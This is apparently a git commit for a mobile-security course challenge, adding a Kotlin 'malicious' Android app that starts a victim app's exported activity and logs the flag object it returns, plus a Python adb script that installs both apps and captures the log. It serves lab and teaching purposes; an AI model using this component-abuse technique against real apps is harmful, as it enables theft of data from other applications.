ec0d419d5ac851835fcee27c7e61d3d3d2e244ee
Alberto Lazari <alberto.lazari@gmail.com>
2023-10-18 10:58:10 +0200

    Challenge 03 (#2)
    * Init
    
    * Do not start emulator
    
    * Ez

---
+++ 03-serialintent/MaliciousApp/app/src/main/java/com/example/maliciousapp/MainActivity.kt
@@ -0,0 +1,33 @@
+package com.example.maliciousapp
+
+import android.content.ComponentName
+import android.content.Intent
+import android.os.Bundle
+import android.util.Log
+
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AppCompatActivity
+
+import com.example.victimapp.FlagContainer
+
+class MainActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+
+        val intent = Intent().apply {
+            component = ComponentName(
+                "com.example.victimapp",
+                "com.example.victimapp.SerialActivity"
+            )
+        }
+        val contract = ActivityResultContracts.StartActivityForResult()
+        registerForActivityResult(contract) { result ->
+            val container = result
+                .data
+                ?.getSerializableExtra("flag", FlagContainer::class.java)
+
+            container?.let { Log.d("MOBIOTSEC", it.getFlag()) }
+        }.launch(intent)
+    }
+}
---
+++ 03-serialintent/serialintent_checker.py
@@ -0,0 +1,68 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# ~/Android/Sdk/tools/bin/avdmanager list avd
+# ~/Android/Sdk/tools/avdmanager create avd --force --name mobiotsec --abi google_apis/x86 --package 'system-images;android-26;google_apis;x86'
+# ~/Android/Sdk/emulator/emulator -avd mobiotsec -no-audio -no-boot-anim -accel on -gpu swiftshader_indirect &
+
+import argparse
+import os
+import shutil
+import time
+import subprocess as subp
+from androguard.core.bytecodes.apk import APK
+
+def parse_logs():
+    with open('./serialintent_logs.txt') as f:
+        print(f.read())
+
+def print_logs():
+    f = open("serialintent_logs.txt", "w")
+    subp.call(["adb", "logcat", "-c"])
+    try:
+        subp.call(["adb", "logcat", "-s", "MOBIOTSEC"], stdout=f, timeout=3)
+    except subp.TimeoutExpired:
+        parse_logs()
+
+def launch_app(apk):
+    print("Launching the app")
+    mainactivity = "{}/{}".format(apk.get_package(), apk.get_main_activity())
+    os.system("adb shell am start -n {act}".format(act=mainactivity))
+
+def uninstall(apk):
+    if (os.system("adb shell pm list packages | grep {package}".format(package=apk.get_package())) == 0):
+        print("Uninstalling the app")
+        subp.call(["adb", "uninstall", apk.get_package()], stdout=subp.DEVNULL)
+
+def install(apk):
+    print("Installing the app")
+    while True:
+        try:
+            os.system("adb install -g {apk}".format(apk=apk.get_filename()))
+            break
+        except subp.CalledProcessError as err:
+            print('[!] install failed')
+            print(err)
+            print('[!] retrying')
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("victimapp_apk_path", help="path to the victim app apk file")
+    parser.add_argument("malapp_apk_path", help="path to the malicious app apk file")
+    args = parser.parse_args()
+    return args
+
+def main(args):
+    # print("Launching the emulator")
+    # os.system("~/Android/Sdk/emulator/emulator -avd mobiotsec -no-audio -no-boot-anim -accel on -gpu swiftshader_indirect &")
+    # time.sleep(3)
+    victimApk = APK(args.victimapp_apk_path)
+    malApk = APK(args.malapp_apk_path)
+    uninstall(victimApk)
+    install(victimApk)
+    uninstall(malApk)
+    install(malApk)
+    launch_app(malApk)
+    print_logs()
+
+if __name__ == "__main__":
+    main(parse_args())
